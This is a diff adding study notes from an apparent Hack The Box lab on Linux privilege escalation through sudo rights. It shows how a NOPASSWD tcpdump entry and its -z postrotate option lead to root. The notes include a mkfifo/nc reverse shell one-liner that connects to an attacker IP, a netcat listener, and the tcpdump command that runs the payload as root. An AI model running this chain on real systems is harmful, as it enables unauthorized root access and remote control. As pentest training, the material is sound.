@@ -1007,3 +1007,59 @@ They are represented with an **s** instead of the usual **x** in file permission
   * Using GTFOBins (a known database of binaries that can be abused for privilege escalation).
 
 ---
+
+# ⚡ Sudo Rights Abuse
+
+**Sudo privileges** allow a user to execute commands as another user (often root) without switching accounts. These privileges are defined in the `/etc/sudoers` file.  
+
+When landing on a system, always check sudo rights:  
+```bash
+sudo -l
+````
+
+* If **NOPASSWD** is present → the user can run the command without entering a password.
+* This is often misconfigured and can lead to **privilege escalation**.
+
+## 🔍 Example: Misconfigured sudo with tcpdump
+
+```bash
+htb_student@NIX02:~$ sudo -l
+User sysadm may run the following commands on NIX02:
+    (root) NOPASSWD: /usr/sbin/tcpdump
+```
+
+* The user can run **tcpdump** as root, without a password.
+* The **`-z postrotate-command`** option of tcpdump allows execution of a command/script after rotating capture files.
+
+## 🚀 Exploiting tcpdump sudo rights
+
+1. **Create a malicious script** (e.g., reverse shell):
+
+   ```bash
+   cat /tmp/.test
+   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
+   ```
+
+2. **Set up a listener** on the attacker’s machine:
+
+   ```bash
+   nc -lnvp 443
+   ```
+
+3. **Run tcpdump with sudo and the -z option**:
+
+   ```bash
+   sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+   ```
+
+4. **Result**:
+
+   * tcpdump executes the script as **root**.
+   * Attacker gains a **root reverse shell**.
+
+#### ⚠️ Limitations
+
+* In newer Linux distros, **AppArmor** and similar protections restrict the `postrotate-command` options (e.g., only gzip/bzip2 allowed).
+
+---
+
